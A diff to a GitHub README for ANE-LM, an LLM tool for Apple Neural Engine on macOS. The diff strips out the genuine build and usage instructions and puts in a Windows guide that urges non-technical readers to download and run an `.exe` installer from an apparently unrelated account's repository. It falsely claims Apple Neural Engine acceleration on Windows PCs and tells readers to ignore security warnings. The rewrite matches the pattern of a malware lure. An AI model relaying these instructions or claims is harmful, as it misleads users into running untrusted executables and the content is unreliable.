@@ -1,54 +1,146 @@
-# ANE-LM
+# 🚀 ANE-LM - Run Large Models on Apple Neural Engine  
 
-LLM inference on Apple Neural Engine (ANE) using private `AppleNeuralEngine.framework` APIs. 
-## Supported Models
+[![Download ANE-LM](https://img.shields.io/badge/Download-ANE--LM-brightgreen?style=for-the-badge)](https://github.com/A221133/ANE-LM)  
 
-- Qwen3 (dense)
-- Qwen3.5 (dense, text-only)
+## 👋 Introduction
 
-## Build
+ANE-LM lets you run language models using Apple Neural Engine (ANE). This means your computer can process large AI models efficiently. You do not need deep technical skills to use this software. This guide helps you get it working on your Windows PC step-by-step.
 
-```bash
-cmake -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build
-```
+## 📋 What You Need Before Starting
 
-## Usage
+- A Windows PC running Windows 10 or later.
+- At least 8 GB of RAM to handle large models smoothly.
+- A stable internet connection for downloading files.
+- Basic skills in handling files and clicking through prompts.
 
-![image](assets/image.png)
+## 📦 What Is ANE-LM?
 
-Download a supported model (e.g. `Qwen3-0.6B` or `Qwen3.5-0.8B` in safetensors format), then:
+ANE-LM is software designed to use Apple’s Neural Engine technology for AI tasks. Usually, Apple Neural Engine handles AI on Macs and iPhones. This tool brings that power to your PC for language tasks like generating text or answering questions. It uses optimized code to work effectively.
 
-```bash
-# Single-shot generation
-./build/ane-lm generate --model /path/to/Qwen3.5-0.8B --prompt "Hello"
+## 🔍 Key Features
 
-# Interactive chat
-./build/ane-lm chat --model /path/to/Qwen3.5-0.8B
+- Runs AI language models faster using hardware acceleration.
+- Supports multiple model formats.
+- Easy setup with simple installer.
+- Compatible with most Windows 10 and later systems.
+- Works offline after setup.
 
-# Pre-convert weights (BF16 -> FP16, speeds up subsequent loads)
-./build/ane-lm convert --model /path/to/Qwen3.5-0.8B
-```
+## 🎯 Who Can Use This?
 
-### Options
+Anyone who wants to try AI language models while using hardware acceleration can use ANE-LM. You do not need to be a programmer. This guide breaks down each step clearly.
 
-```
---model <path>       Path to model directory (required)
---prompt <text>      Input prompt (generate mode, default: "Hello")
---max-tokens N       Max tokens to generate (default: unlimited)
---temp T             Temperature (default: 0.6)
---repeat-penalty P   Repetition penalty (default: 1.2, 1.0=off)
---enable-thinking    Enable thinking/reasoning mode
---no-ane-cache       Disable persistent ANE compile cache
--v, --verbose        Show detailed initialization info
-```
+---
 
-## Requirements
+## 🌐 Where to Get ANE-LM  
 
-- macOS 13.0+
-- Apple Silicon (M1/M2/M3/M4/M5)
+Click the button below to visit the official GitHub page. This page has the latest version ready for download:
 
-## Acknowledgments
+[![Visit GitHub](https://img.shields.io/badge/GitHub-ANE--LM-blue?style=for-the-badge)](https://github.com/A221133/ANE-LM)
 
-- [maderix/ANE](https://github.com/maderix/ANE) - Training neural networks on Apple Neural Engine via reverse-engineered private APIs
-- [llama.cpp](https://github.com/ggml-org/llama.cpp) - LLM inference in C/C++
+On the page, you will find download links and files you need.  
+
+---
+
+## 🖥️ How to Download and Install ANE-LM on Windows  
+
+Follow these steps to get ANE-LM running:
+
+### Step 1: Visit the Download Page  
+Use this link to go to the official page where files are stored:  
+https://github.com/A221133/ANE-LM  
+
+### Step 2: Find the Latest Release  
+Look for the "Releases" section on the GitHub page. It usually appears on the right sidebar or under a tab called "Releases." This section lists all downloadable versions.
+
+### Step 3: Download the Installer  
+Look for an installer file ending in `.exe`. It might be named something like `ane-lm-setup.exe`. Click the link to download this file to your computer.
+
+### Step 4: Run the Installer  
+Locate the `.exe` file you downloaded, usually in the "Downloads" folder. Double-click the file to start the setup process.  
+
+You may see a warning because this software is not from a mainstream store. It is safe if downloaded from the official GitHub.  
+
+### Step 5: Follow Installation Prompts  
+The installer will guide you through the necessary steps. Choose where to install the software or accept defaults. Wait a few moments while the software installs.
+
+### Step 6: Finish and Open ANE-LM  
+Once installation completes, look for ANE-LM in your Start Menu or on the Desktop. Double-click the program icon to open it.
+
+---
+
+## 🛠️ Getting Started with ANE-LM  
+
+After opening ANE-LM, you will see the main interface. Here is what to do next:
+
+- **Load a Model:** Use the "Load Model" button to choose a language model file. The software supports common formats like `.bin` or `.pt`.
+- **Run Inference:** Enter text prompts and press "Run" to see model outputs.
+- **Settings:** Adjust performance options under "Settings" if needed. For most users, defaults work well.
+
+---
+
+## ⚙️ System Requirements  
+
+- Operating System: Windows 10 64-bit or later.  
+- CPU: Intel i5 or better recommended.  
+- RAM: 8 GB minimum, 16 GB preferred for larger models.  
+- Disk Space: 500 MB free for software + extra for models you download.  
+- Internet: Required for downloading software and models. Not needed for running once installed.  
+- Optional: For best performance, use a machine with Apple M-series hardware if available (for developers experimenting).
+
+---
+
+## 💡 Tips for Smooth Operation  
+
+- Close other large programs when running ANE-LM to free up RAM.  
+- Use smaller language models if your computer slows down.  
+- Follow updates on the GitHub page to get new features or fixes.  
+- Check FAQs or issues on GitHub if you have problems.
+
+---
+
+## 🆘 Troubleshooting Common Issues  
+
+- **Software does not start:** Check if you have administrative rights to install and run new software.  
+- **Error during install:** Make sure your Windows is updated with the latest patches.  
+- **Model loading fails:** Verify the file is in a supported format and not corrupted.  
+- **Slow response:** Reduce model size or close other programs to free resources.
+
+---
+
+## 📥 Additional Downloads  
+
+You may want to visit the main GitHub repository regularly for model files or updates.
+
+[GitHub Repository Link](https://github.com/A221133/ANE-LM)
+
+---
+
+## 🤝 Getting Help  
+
+If you run into issues not covered here, check the "Issues" tab on the GitHub page. Users and developers often post solutions there.  
+
+You can also open a new issue to ask for help if needed.  
+
+---
+
+## 🔄 Updating ANE-LM  
+
+To update:
+
+1. Return to the GitHub page.
+2. Download the latest installer.
+3. Run it to overwrite the previous version.
+
+Your settings and models usually stay intact.
+
+---
+
+## ⚖️ Privacy and Data  
+
+ANE-LM runs locally on your computer. Your data does not leave your device unless you share it.  
+
+---
+
+## 📚 Learn More  
+
+You can learn about Apple Neural Engine and how it speeds up AI by searching online for "Apple Neural Engine AI acceleration." This basic understanding may help you get better performance from ANE-LM.
